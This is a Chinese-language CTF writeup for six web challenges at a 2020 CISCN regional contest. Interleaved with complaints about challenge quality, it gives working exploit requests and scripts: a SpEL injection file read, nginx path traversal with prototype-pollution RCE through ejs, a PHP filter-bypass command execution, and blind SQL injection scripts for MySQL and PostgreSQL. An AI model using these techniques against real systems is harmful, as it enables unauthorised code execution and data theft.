---
title: 2020 CISCN 华东北赛区 WEB Writeup
date: 2020-09-19 22:14:55
tags: [web, ctf]
---

一共 6 题 WEB, 我一个人拿了 4 个一血, 还有一题全场 0 解. 然而没有 pwn 爷爷依旧被吊打, 而且题目质量是真的差, 明年再打国赛我是傻逼.

<!-- more -->

## web3

http://172.20.29.103:80/flag.php 直接返回 flag. 你们赛宁没有题目复审的么?

## web4

随便 fuzz 根据报错得知是 sepl，构造 payload T%00 绕过过滤直接读文件即可, fix 的时候给看源码, 发现出题人正则写成了 `"T\\\\x00"`, 应该是想到了要过滤的, 你们赛宁没有题目复审的么? x2
```
POST / HTTP/1.1
Host: 172.20.29.104:8080
Content-Length: 91
Cache-Control: max-age=0
Origin: http://172.20.29.104:8080
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.20.29.104:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7
Connection: close

expr=T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get%00('/flag.txt')) 
```

## web7

扫出来只有 static 文件夹，根据 server header 得知服务器用的 nginx，同时存在配置错误，可以目录穿越读取文件.  
http://172.20.29.107/static../app.js, 在源码中发现使用了 `express-fileupload` ，存在原型链污染，可以结合 ejs 利用，直接 rce

```
POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1
Host: 172.20.29.107
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 263
Content-Type: multipart/form-data; boundary=------------------------a4826c30ee705335
Connection: close

--------------------------a4826c30ee705335
Content-Disposition: form-data; name="__proto__.outputFunctionName"

_tmp1;global.process.mainModule.require('child_process').exec('cat /flag.txt > flag.txt');var __tmp2
--------------------------a4826c30ee705335--
```
然后读取 http://172.20.29.107/static../flag.txt 即可

## web2

robots.txt 得到 hint.txt, 可以得到 sql 语句， 根据其特性，用 \ 来注入， 之后绕 waf 注入出密码，登陆后得到 c2ZtdHFs.php, 
```python
import requests
import string

sess = requests.session()
url = 'http://172.20.29.102/'

flag = '0x5e'
table = string.ascii_letters + '_' + string.digits
table = [ord(i) for i in table]
raw_flag = ''
for _ in range(100):
    for i in table:
        t = flag + hex(i)[2:].rjust(0, '2')
        #print(t)
        data = {
            'username': '\\',
            'password': '||password/**/regexp/**/binary/**/%s#' % t
        }

        res = sess.post(url, data)
        if 'success' in res.text:
            #print(chr(i))
            flag += hex(i)[2:].rjust(0, '2')
            print(flag)
            raw_flag += chr(i)
            print(raw_flag)
            break

    if i == table[-1]:
        print('WARNGIN')
```

用 & 绕一下过滤，即可 rce
```
GET /c2ZtdHFs.php?gzmtu=(sysuem%26sysvem)((currenu%26currenv)((weucmmhecders%26oevennheeders)())) HTTP/1.1
A: cat /flag.txt
Host: 172.20.29.102

```

## web5

pgsql 注入，双写绕过 select，之后熟悉下语法写脚本注入后登陆就有 flag
```python
import requests
import string

sess = requests.session()
url = 'http://172.20.29.105/index.php'

def to_chr(inp):
    ret = ''
    for i in inp:
        ret += f"||chr({ord(i)})"
    return ret

table = string.ascii_letters + string.digits + '_.-'
flag = ''
table = string.printable
table = [ord(i) for i in table]
query = 'selselectect/**/password/**/from/**/users/**/limit/**/1/**/OFFSET/**/0'

for _ in range(100):
    for i in table:
        t = to_chr(flag) + f'||chr({i})'
        t = t[2:]

        data = {
            'username': 'admin',
            'password': "admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1" % (t, query)
        }

        res = sess.post('http://172.20.29.105/index.php', data=data)
        #print(res.text)
        if 'hacker' in res.text:
            print('hacker')

        if 'Too Young Too Simple' in res.text:
            flag += chr(i)
            print(flag)
            break
        if i == table[-1]:
            print('WARNNING')

            for _ in range(100):
                for i in table:
                    t = f'||chr({i})' + to_chr(flag)
                    t = t[2:]
                    data = {
                        'username': 'admin',
                        'password': "admin'/**/or/**/'1'/**/and/**/cast(position(%s/**/in/**/(%s))/**/as/**/bool)/**/and/**/'1" % (
                        t, query)
                    }

                    res = sess.post('http://172.20.29.105/index.php', data=data)
                    # print(res.text)
                    if 'hacker' in res.text:
                        print('hacker')

                    if 'Too Young Too Simple' in res.text:
                        flag = chr(i) + flag
                        print(flag)
                        break
                    if i == table[-1]:
                        print('WARNNING')
```

## web6

这题目能把人气笑, 全场 0 解, 最后发现放了个 ssrf.php, 无任何提示, 就硬猜, 而且里面的过滤写成了 `/file:|http://|php/`, 这是过滤了个锤子, 你们赛宁没有题目复审的么? x3
